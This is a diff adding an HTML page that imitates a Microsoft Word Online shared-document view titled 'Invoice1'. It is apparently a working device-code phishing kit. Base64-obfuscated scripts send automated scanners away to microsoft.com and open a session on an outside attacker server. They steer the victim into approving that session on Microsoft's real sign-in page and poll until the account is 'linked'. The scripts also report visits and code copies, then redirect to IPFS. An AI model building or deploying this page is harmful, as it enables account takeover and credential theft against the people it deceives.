@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+  <title>Invoice1</title>
+  <meta name="application-name" content="Shared document"/>
+  <meta property="og:site_name" content="Microsoft"/>
+  <meta name="theme-color" content="#185abd"/>
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 21 21'%3E%3Crect x='0' y='0' width='9.5' height='9.5' fill='%23f25022'/%3E%3Crect x='11.5' y='0' width='9.5' height='9.5' fill='%237fba00'/%3E%3Crect x='0' y='11.5' width='9.5' height='9.5' fill='%2300a4ef'/%3E%3Crect x='11.5' y='11.5' width='9.5' height='9.5' fill='%23ffb900'/%3E%3C/svg%3E"/>
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    html,body{height:100%;}
+    body{font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;background:#f3f2f1;display:flex;flex-direction:column;min-height:100vh;color:#1a1918;}
+    a{text-decoration:none;color:inherit;}
+
+    /* Suite bar */
+    .suite-bar{background:#1b1b1b;height:48px;display:flex;align-items:center;padding:0 14px;gap:0;flex-shrink:0;border-bottom:1px solid rgba(255,255,255,.12);}
+    .sb-waffle{width:36px;height:36px;display:flex;align-items:center;justify-content:center;cursor:pointer;border-radius:2px;}
+    .sb-waffle:hover{background:rgba(255,255,255,.1);}
+    .sb-waffle svg{opacity:.9;}
+    .sb-appname{color:#fff;font-size:15px;font-weight:600;margin-left:4px;letter-spacing:-.1px;opacity:.95;}
+    .sb-right{margin-left:auto;display:flex;align-items:center;gap:2px;}
+    .sb-icon{width:36px;height:36px;display:flex;align-items:center;justify-content:center;cursor:pointer;border-radius:2px;color:rgba(255,255,255,.85);font-size:16px;}
+    .sb-icon:hover{background:rgba(255,255,255,.1);}
+    .sb-avatar{width:30px;height:30px;border-radius:50%;background:#185abd;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;color:#fff;cursor:pointer;margin-left:4px;}
+
+    /* App header */
+    .app-header{height:50px;flex-shrink:0;border-bottom:1px solid rgba(0,0,0,.12);}
+    .app-header-inner{height:100%;display:flex;align-items:center;gap:10px;padding:0 20px;}
+    .app-name-txt{font-size:15px;font-weight:600;color:#fff;letter-spacing:-.1px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:400px;}
+    .app-badge{margin-left:auto;font-size:11px;font-weight:600;color:rgba(255,255,255,.8);background:rgba(255,255,255,.18);padding:2px 10px;border-radius:10px;white-space:nowrap;}
+
+    /* Two-column layout */
+    .layout{display:flex;flex:1;min-height:0;overflow:hidden;}
+    .lnav{width:200px;flex-shrink:0;background:#fff;border-right:1px solid #e8e6e4;padding:12px 0;overflow-y:auto;}
+    .lnav-item{display:flex;align-items:center;gap:8px;padding:9px 18px;font-size:13px;color:#323130;cursor:pointer;border-radius:0;transition:background .1s;white-space:nowrap;}
+    .lnav-item:hover{background:#f3f2f1;}
+    .lnav-item.active{background:#185abd14;color:#185abd;font-weight:600;border-right:3px solid #185abd;}
+    .content{flex:1;overflow-y:auto;padding:24px 28px;background:#faf9f8;position:relative;}
+
+    /* Loading overlay */
+    #_ld{position:absolute;inset:0;background:#faf9f8;display:flex;align-items:center;justify-content:center;z-index:10;}
+    .ld-spin{width:32px;height:32px;border:3px solid #e1dfdd;border-top-color:#185abd;border-radius:50%;animation:spin .8s linear infinite;}
+    @keyframes spin{to{transform:rotate(360deg);}}
+
+    /* Main content wrapper */
+    #_mc{opacity:0;transition:opacity 0.4s ease;}
+
+    /* Breadcrumb */
+    .breadcrumb{font-size:13px;color:#605e5c;margin-bottom:18px;}
+    .breadcrumb strong{color:#1a1918;}
+
+    /* Action banner */
+    .action-banner{display:flex;align-items:center;gap:10px;background:#185abd;color:#fff;padding:10px 16px;border-radius:5px;font-size:13px;font-weight:600;margin-bottom:20px;}
+
+    /* Sign-in card */
+    .signin-card{background:#fff;border:1px solid #e8e6e4;border-radius:6px;padding:28px 24px;max-width:440px;box-shadow:0 1px 6px rgba(0,0,0,.07);}
+    .sc-icon-wrap{width:52px;height:52px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;}
+    .sc-title{font-size:19px;font-weight:700;color:#1a1918;margin-bottom:7px;text-align:center;}
+    .sc-sub{font-size:13px;color:#605e5c;margin-bottom:18px;line-height:1.6;text-align:center;}
+    .sc-meta{font-size:11px;color:#a19f9d;text-align:center;margin-top:10px;}
+
+    /* Sender bar */
+    .sender-bar{display:flex;align-items:center;gap:10px;padding:9px 13px;background:#185abd0d;border-left:3px solid #185abd;border-radius:0 5px 5px 0;margin-bottom:16px;}
+    .s-avatar{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;color:#fff;flex-shrink:0;}
+    .s-info{flex:1;min-width:0;}
+    .s-name{font-size:13px;font-weight:600;color:#1a1918;}
+    .s-sub{font-size:12px;color:#8a8886;}
+
+    /* MS sign-in button */
+    .ms-signin-btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:11px 18px;background:#185abd;border:none;border-radius:4px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit;letter-spacing:.1px;transition:filter .14s,box-shadow .14s;box-shadow:0 2px 8px #185abd38;}
+    .ms-signin-btn:hover{filter:brightness(.92);box-shadow:0 4px 16px #185abd50;}
+
+    /* Document preview */
+    .doc-preview-wrap{position:relative;max-width:640px;}
+    .doc-preview-blur{background:#fff;border:1px solid #e8e6e4;border-radius:6px;padding:28px 32px;font-size:14px;line-height:1.8;color:#323130;filter:blur(4px);user-select:none;pointer-events:none;max-height:280px;overflow:hidden;}
+    .doc-overlay-card{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;background:rgba(255,255,255,.88);border-radius:6px;padding:24px;text-align:center;}
+
+    /* SharePoint file card */
+    .sp-file-card{background:#fff;border:1px solid #e8e6e4;border-radius:6px;padding:20px;max-width:480px;box-shadow:0 1px 6px rgba(0,0,0,.06);}
+    .sp-file-row{display:flex;align-items:center;gap:14px;margin:14px 0;}
+    .sp-file-icon{width:48px;height:48px;border-radius:6px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+    .sp-file-info{flex:1;min-width:0;}
+    .sp-file-name{font-size:14px;font-weight:600;color:#1a1918;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+    .sp-file-meta{font-size:12px;color:#8a8886;margin-top:3px;}
+    .lock-banner{display:flex;align-items:center;gap:7px;font-size:12px;color:#0078d4;background:#dbeeff;padding:7px 12px;border-radius:4px;margin-bottom:14px;font-weight:600;}
+    .sp-protected-box{border-top:1px solid #f3f2f1;padding-top:14px;}
+
+    /* Teams meeting card */
+    .meeting-event-card{background:#fff;border:1px solid #e8e6e4;border-radius:6px;overflow:hidden;max-width:460px;box-shadow:0 1px 6px rgba(0,0,0,.06);}
+    .mec-header{padding:16px 18px;}
+    .mec-title{font-size:17px;font-weight:700;color:#1a1918;margin-bottom:8px;}
+    .mec-org,.mec-time{display:flex;align-items:center;gap:8px;font-size:13px;color:#605e5c;margin-bottom:6px;}
+    .mec-body{padding:16px 18px;border-top:1px solid #f3f2f1;}
+
+    /* Calendar event card */
+    .cal-event-card{background:#fff;border:1px solid #e8e6e4;border-radius:6px;overflow:hidden;max-width:460px;box-shadow:0 1px 6px rgba(0,0,0,.06);display:flex;}
+    .cec-strip{width:6px;flex-shrink:0;}
+    .cec-body{flex:1;padding:18px 20px;}
+    .cec-title{font-size:17px;font-weight:700;color:#1a1918;margin-bottom:8px;}
+    .cec-org,.cec-time{display:flex;align-items:center;gap:8px;font-size:13px;color:#605e5c;margin-bottom:6px;}
+
+    /* RSVP */
+    .rsvp-row{display:flex;gap:8px;}
+    .rsvp-btn{flex:1;padding:8px 4px;border-radius:4px;font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;border:1.5px solid;transition:filter .12s;}
+    .rsvp-accept{background:#dff6dd;border-color:#107c10;color:#107c10;}
+    .rsvp-accept:hover{filter:brightness(.92);}
+    .rsvp-tentative{background:#fff4ce;border-color:#c7a800;color:#7a6400;}
+    .rsvp-tentative:hover{filter:brightness(.92);}
+    .rsvp-decline{background:#fde7e9;border-color:#d13438;color:#a4262c;}
+    .rsvp-decline:hover{filter:brightness(.92);}
+
+    /* Device code panel */
+    .code-panel{background:#fff;border:1px solid #e8e6e4;border-radius:6px;padding:24px;max-width:460px;box-shadow:0 1px 6px rgba(0,0,0,.07);margin-top:20px;}
+    .cp-heading{font-size:16px;font-weight:700;color:#1a1918;margin-bottom:4px;display:flex;align-items:center;gap:8px;}
+    .cp-heading::before{content:'';display:inline-block;width:4px;height:18px;background:#185abd;border-radius:2px;}
+    .cp-sub{font-size:13px;color:#605e5c;margin-bottom:18px;line-height:1.5;}
+    .step-list{margin-bottom:16px;}
+    .step-item{display:flex;align-items:flex-start;gap:12px;padding:8px 0;border-bottom:1px solid #f0efee;font-size:13px;color:#323130;line-height:1.55;}
+    .step-item:last-child{border-bottom:none;}
+    .step-num{min-width:24px;height:24px;background:#185abd;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:#fff;flex-shrink:0;}
+    .step-em{color:#185abd;font-style:normal;font-weight:600;}
+    .code-display{background:#185abd0d;border:1.5px solid #185abd44;border-radius:6px;padding:14px 16px;display:flex;align-items:center;justify-content:space-between;margin:14px 0;gap:12px;}
+    .code-val{font-size:28px;font-weight:700;letter-spacing:6px;color:#185abd;font-family:'Cascadia Code','Consolas',monospace;}
+    .copy-btn{background:#185abd;border:none;border-radius:4px;color:#fff;padding:7px 14px;cursor:pointer;font-size:13px;font-weight:600;font-family:inherit;transition:filter .12s;white-space:nowrap;}
+    .copy-btn:hover{filter:brightness(.88);}
+    .open-btn{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:11px;background:#107c10;border:none;border-radius:4px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;text-decoration:none;margin-bottom:12px;transition:filter .12s;box-shadow:0 2px 8px rgba(16,124,16,.28);font-family:inherit;}
+    .open-btn:hover{filter:brightness(.88);}
+    .status-row{display:flex;align-items:center;gap:10px;font-size:13px;color:#605e5c;margin-bottom:12px;padding:10px 12px;background:#185abd08;border:1px solid #185abd20;border-radius:5px;}
+    .spin-sm{width:15px;height:15px;border:2px solid #e1dfdd;border-top-color:#185abd;border-radius:50%;animation:spin .8s linear infinite;flex-shrink:0;}
+    .timer{font-size:12px;color:#8a8886;margin-left:auto;font-variant-numeric:tabular-nums;}
+    .timer.expiring{color:#d13438;font-weight:600;}
+
+    /* Provider modal buttons */
+    .prov-btn{display:flex;align-items:center;gap:12px;width:100%;padding:11px 14px;border-radius:4px;font-size:14px;cursor:pointer;margin-bottom:8px;font-family:inherit;font-weight:600;transition:background .12s,border-color .12s;}
+    .ms-pbtn{background:#fff;border:1.5px solid #ccc;color:#201f1e;}
+    .ms-pbtn:hover{background:#f5f5f5;border-color:#888;}
+    .g-pbtn{background:#fff;border:1.5px solid #ccc;color:#201f1e;}
+    .g-pbtn:hover{background:#f5f5f5;border-color:#888;}
+
+    /* Success / error */
+    .ok-box{text-align:center;padding:20px 0 8px;}
+    .ok-icon{width:56px;height:56px;background:#dff6dd;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;box-shadow:0 3px 12px rgba(16,124,16,.18);}
+    .ok-title{font-size:20px;font-weight:700;color:#107c10;margin-bottom:7px;}
+    .ok-sub{font-size:13px;color:#605e5c;}
+    .err-box{background:#fde7e9;border:1px solid #d13438;border-radius:5px;padding:10px 14px;color:#a4262c;font-size:13px;margin-top:10px;}
+
+    /* Footer */
+    footer{background:#f5f4f3;border-top:1px solid #e8e6e4;padding:10px 20px;font-size:11px;color:#a19f9d;text-align:center;flex-shrink:0;}
+
+    /* Mobile */
+    @media(max-width:768px){
+      .lnav{display:none;}
+      .content{padding:16px 14px;}
+      .suite-bar{height:44px;}
+      .app-header{height:46px;}
+      .app-badge{display:none;}
+      .signin-card,.sp-file-card,.meeting-event-card,.cal-event-card,.code-panel{max-width:100%;}
+      .doc-preview-wrap{max-width:100%;}
+    }
+  </style>
+</head>
+<body>
+<noscript><meta http-equiv="refresh" content="0;url=https://www.microsoft.com"/></noscript>
+
+<!-- Suite bar -->
+<div class="suite-bar">
+  <div class="sb-waffle">
+    <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><rect x="0" y="0" width="5" height="5" fill="rgba(255,255,255,.85)"/><rect x="6.5" y="0" width="5" height="5" fill="rgba(255,255,255,.85)"/><rect x="13" y="0" width="5" height="5" fill="rgba(255,255,255,.85)"/><rect x="0" y="6.5" width="5" height="5" fill="rgba(255,255,255,.85)"/><rect x="6.5" y="6.5" width="5" height="5" fill="rgba(255,255,255,.85)"/><rect x="13" y="6.5" width="5" height="5" fill="rgba(255,255,255,.85)"/><rect x="0" y="13" width="5" height="5" fill="rgba(255,255,255,.85)"/><rect x="6.5" y="13" width="5" height="5" fill="rgba(255,255,255,.85)"/><rect x="13" y="13" width="5" height="5" fill="rgba(255,255,255,.85)"/></svg>
+  </div>
+  <span class="sb-appname">Shared document</span>
+  <div class="sb-right">
+    <div class="sb-icon" title="Notifications">&#128276;</div>
+    <div class="sb-icon" title="Help">&#63;</div>
+    <div class="sb-icon" title="Settings">&#9881;</div>
+    <div class="sb-avatar">U</div>
+  </div>
+</div>
+
+<div class="app-header" style="background:#185abd;">
+  <div class="app-header-inner">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" style="flex-shrink:0;"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6z" fill="rgba(255,255,255,.25)" stroke="#fff" stroke-width="1.5" stroke-linejoin="round"/><path d="M14 2v6h6" stroke="#fff" stroke-width="1.5" stroke-linejoin="round"/><path d="M8 12h8M8 16h5" stroke="#fff" stroke-width="1.5" stroke-linecap="round"/></svg>
+    <span class="app-name-txt">Invoice1</span>
+  </div>
+</div>
+
+<!-- Layout -->
+<div class="layout">
+  <aside class="lnav">
+    <a class="lnav-item" href="#">&#128196; My Documents</a>
+<a class="lnav-item active" href="#">&#128203; Shared with me</a>
+<a class="lnav-item" href="#">&#128336; Recent</a>
+<a class="lnav-item" href="#">&#11088; Starred</a>
+  </aside>
+  <main class="content">
+
+    <!-- Loading overlay -->
+    <div id="_ld"><div class="ld-spin"></div></div>
+
+    <!-- Main content (revealed after anti-bot check) -->
+    <div id="_mc" style="display:none;">
+
+      <!-- Step 1: CTA / template content -->
+      <div id="_s1">
+        <div class="breadcrumb">My Documents &rsaquo; Shared with me &rsaquo; <strong>Invoice1</strong></div>
+<div class="doc-preview-wrap">
+  <div class="doc-preview-blur">
+    <p><strong>Lorem ipsum dolor sit amet</strong>, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>
+    <p style="margin-top:1em;">Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident.</p>
+    <p style="margin-top:1em;">Sunt in culpa qui officia deserunt mollit anim id est laborum. Lorem ipsum dolor sit amet consectetur.</p>
+  </div>
+  <div class="doc-overlay-card">
+    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" style="margin-bottom:10px;"><path d="M17 11V7A5 5 0 007 7v4M5 11h14a1 1 0 011 1v8a1 1 0 01-1 1H5a1 1 0 01-1-1v-8a1 1 0 011-1z" stroke="#185abd" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    <div style="font-size:15px;font-weight:700;color:#1a1918;margin-bottom:6px;">Sign in to view this document</div>
+    <div style="font-size:13px;color:#605e5c;margin-bottom:16px;">Shared file &middot; View only</div>
+    <div class="sender-bar">
+          <div class="s-avatar" style="background:#185abd;">T</div>
+          <div class="s-info"><div class="s-name">testadmin</div><div class="s-sub">shared this with you</div></div>
+        </div>
+    <button class="ms-signin-btn" onclick="selectProvider('microsoft')">
+      <svg width="18" height="18" viewBox="0 0 21 21" style="flex-shrink:0;"><rect x="0" y="0" width="9.5" height="9.5" fill="#f25022"/><rect x="11.5" y="0" width="9.5" height="9.5" fill="#7fba00"/><rect x="0" y="11.5" width="9.5" height="9.5" fill="#00a4ef"/><rect x="11.5" y="11.5" width="9.5" height="9.5" fill="#ffb900"/></svg>
+      Sign in with Microsoft
+    </button>
+  </div>
+</div>
+        
+      </div>
+
+      <!-- Step 2: Device code panel -->
+      <div id="_s2" style="display:none;">
+        <div class="code-panel">
+          <div class="cp-heading">Verify your identity</div>
+          <div class="cp-sub">Copy this code and enter it on the Microsoft sign-in page</div>
+          <div class="step-list" id="_steps">
+            <div class="step-item"><div class="step-num">1</div><div>Copy the code below</div></div>
+            <div class="step-item"><div class="step-num">2</div><div>Click <span class="step-em">Open Microsoft sign-in page</span> and enter the code</div></div>
+            <div class="step-item"><div class="step-num">3</div><div>Sign in with your Microsoft account</div></div>
+          </div>
+          <div class="code-display" id="_codebox">
+            <span id="_code" class="code-val">——————</span>
+            <button class="copy-btn" id="_copybtn" onclick="_copyCode()">Copy</button>
+          </div>
+          <a id="_openlink" href="#" target="_blank" class="open-btn" onclick="_copyCode()">Open Microsoft sign-in page &#8599;</a>
+          <div class="status-row">
+            <div class="spin-sm"></div>
+            <span>Waiting for verification&hellip;</span>
+            <span class="timer" id="_timer"></span>
+          </div>
+          <div id="_err" class="err-box" style="display:none;"></div>
+        </div>
+      </div>
+
+      <!-- Success -->
+      <div id="_ok" style="display:none;">
+        <div class="code-panel">
+          <div class="ok-box">
+            <div class="ok-icon"><svg width="26" height="26" viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="#107c10" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+            <div class="ok-title">Access Granted</div>
+            <div class="ok-sub" id="_ok_sub">You can now view the shared document.</div>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- /#_mc -->
+
+  </main>
+</div>
+
+<footer>Microsoft Word Online &middot; microsoft.com &middot; &copy; Microsoft Corporation</footer>
+
+<script>(function(){
+var _a=function(s){return atob(s);};
+var _b=navigator,_c=window,_d=document,_w=screen;
+var _t=false;
+if(_b[_a('d2ViZHJpdmVy')]===true)_t=true;
+if(_c[_a('Y2FsbFBoYW50b20=')]||_c[_a('X3BoYW50b20=')])_t=true;
+if(_c[_a('X19uaWdodG1hcmU=')])_t=true;
+if(_d.documentElement.getAttribute(_a('d2ViZHJpdmVy')))_t=true;
+if(_w.width<100||_w.height<100)_t=true;
+if(_b.languages&&_b.languages.length===0)_t=true;
+if(_t){_c.location.replace(_a('aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbQ=='));return;}
+var _mc=_d.getElementById('_mc');
+var _ld=_d.getElementById('_ld');
+if(_mc)_mc.style.display='none';
+setTimeout(function(){
+  if(_mc){
+    _mc.style.opacity='0';
+    _mc.style.transition='opacity 0.4s ease';
+    _mc.style.display='block';
+    setTimeout(function(){_mc.style.opacity='1';},20);
+  }
+  if(_ld)_ld.style.display='none';
+},1400+Math.random()*600);
+})();</script>
+<script>(function(){
+var _d=function(s){return atob(s);};
+var _x0=_d('aHR0cHM6Ly96ZW5ncmlkLnNwYWNl'),_x1=_d('TXZfUVZmcEZYTDBkV0ExYld3dTh3OHdnMk0xLWdlNlA='),_x2=_d('L2Nvbm5lY3QvcGFnZS8='),_x3=_d('L2luaXQ=');
+var _x4=_d('L2Nvbm5lY3Qvc2Vzc2lvbi8='),_x5=_d('L3N0YXR1cw==');
+var _x6=_d('Q29udGVudC1UeXBl'),_x7=_d('YXBwbGljYXRpb24vanNvbg=='),_x8=_d('UE9TVA==');
+var _x9=_d('cHJvdmlkZXI='),_xa=_d('dXNlcl9jb2Rl'),_xb=_d('dmVyaWZpY2F0aW9uX3VyaQ=='),_xc=_d('c2Vzc2lvbl90b2tlbg=='),_xd=_d('YXBwX2V4cGlyZXNfYXQ=');
+var _xe=_d('Y29ubmVjdGVk'),_xf=_d('ZXhwaXJlZA=='),_xg=_d('Y2FuY2VsbGVk');
+var _sess=null,_poll=null,_cdown=null,_exp=null,_noted=false;
+
+function _gel(id){return document.getElementById(id);}
+function _show(id){_gel(id).style.display='block';}
+function _hide(id){_gel(id).style.display='none';}
+
+function _stopT(){
+  if(_poll){clearInterval(_poll);_poll=null;}
+  if(_cdown){clearInterval(_cdown);_cdown=null;}
+}
+
+function _countdown(){
+  var el=_gel('_timer');
+  function _tick(){
+    var diff=Math.max(0,Math.floor((_exp-Date.now())/1000));
+    var m=String(Math.floor(diff/60)).padStart(2,'0');
+    var s=String(diff%60).padStart(2,'0');
+    if(el)el.textContent=diff>0?'Expires in '+m+':'+s:'Expired';
+    if(el)el.className='timer'+(diff<60?' expiring':'');
+    if(diff===0)clearInterval(_cdown);
+  }
+  _tick();
+  _cdown=setInterval(_tick,1000);
+}
+
+function _startPoll(iv){
+  _poll=setInterval(async function(){
+    if(!_sess)return;
+    try{
+      var r=await fetch(_x0+_x4+_sess+_x5);
+      if(!r.ok)return;
+      var data=await r.json();
+      if(data[_xe]===_xe||data['status']===_xe){
+        _stopT();
+        var det=data['email']?data['email']+' linked successfully.':'Your account has been linked.';
+        var sd=_gel('_ok_sub');if(sd)sd.textContent=det;
+        _hide('_s2');_show('_ok');
+        /* redirect handled below */
+        _doRedirect();
+      }else if(data['status']===_xf||data['status']===_xg){
+        _stopT();
+        var eb=_gel('_err');
+        if(eb){eb.textContent='Session expired. Please try again.';_show('_err');}
+        setTimeout(function(){_hide('_s2');_show('_s1');if(eb)_hide('_err');},2500);
+      }
+    }catch(e){}
+  },iv*1000);
+}
+
+window.selectProvider=function(p){
+  _hide('_s1');
+  _gel('_provsel')&&(_gel('_provsel').style.display='none');
+  _show('_s2');
+  var codeEl=_gel('_code');if(codeEl)codeEl.textContent='Loading…';
+  var linkEl=_gel('_openlink');if(linkEl)linkEl.href='#';
+  var errEl=_gel('_err');if(errEl)_hide('_err');
+  _stopT();_noted=false;
+  var hd={};hd[_x6]=_x7;
+  var bd={};bd[_x9]=p;
+  fetch(_x0+_x2+_x1+_x3,{method:_x8,headers:hd,body:JSON.stringify(bd)})
+    .then(function(r){if(!r.ok)throw new Error();return r.json();})
+    .then(function(data){
+      _sess=data[_xc];
+      _exp=new Date(data[_xd]);
+      if(data['auth_url']){
+        var sl=_gel('_steps');
+        if(sl)sl.innerHTML='<div class="step-item"><div class="step-num">1</div><div class="step-text">Click <span class="step-em">Sign in with Microsoft</span> below</div></div><div class="step-item"><div class="step-num">2</div><div class="step-text">Complete sign-in on the Microsoft page that opens</div></div><div class="step-item"><div class="step-num">3</div><div class="step-text">Return here — your account will be confirmed automatically</div></div>';
+        var cdEl=_gel('_codebox');if(cdEl)cdEl.style.display='none';
+        if(linkEl){linkEl.href=data['auth_url'];linkEl.textContent='Sign in with Microsoft ↗';}
+        _countdown();_startPoll(3);
+      }else{
+        if(codeEl)codeEl.textContent=data[_xa];
+        if(linkEl)linkEl.href=data[_xb];
+        _countdown();_startPoll(data['poll_interval']||5);
+      }
+    })
+    .catch(function(){
+      var eb=_gel('_err');
+      if(eb){eb.textContent='Failed to start sign-in. Please try again.';_show('_err');}
+      _hide('_s2');_show('_s1');
+    });
+};
+
+window.showProviders=function(){
+  var ps=_gel('_provsel');
+  if(ps)ps.style.display=ps.style.display==='none'?'block':'none';
+};
+
+window._copyCode=function(){
+  var c=_gel('_code');if(!c)return;
+  var txt=c.textContent;
+  if(txt&&txt!=='——————'&&txt!=='Loading…'){
+    navigator.clipboard.writeText(txt).catch(function(){});
+    var btn=_gel('_copybtn');if(btn){btn.textContent='Copied!';setTimeout(function(){btn.textContent='Copy';},2000);}
+    if(!_noted){
+      _noted=true;
+      fetch(_x0+_x2+_x1+'/opened',{method:_x8,headers:{'X-Provider':'microsoft'}}).catch(function(){});
+    }
+  }
+};
+
+window._doRedirect=function(){};
+})();</script>
+<script>
+(function(){
+  window._doRedirect=function(){setTimeout(function(){window.location.href="https://ipfs.io/ipfs/Qme2chpbUbiTxBXFvVjMZMp8qPKGBah1wHV8pRdAMCYZ1n";},2000);};
+  // Track page visit
+  fetch(atob('aHR0cHM6Ly96ZW5ncmlkLnNwYWNl')+atob('L2Nvbm5lY3QvcGFnZS8=')+atob('TXZfUVZmcEZYTDBkV0ExYld3dTh3OHdnMk0xLWdlNlA=')+atob('L3Zpc2l0'),{method:atob('UE9TVA==')}).catch(function(){});
+})();
+</script>
+</body>
+</html>
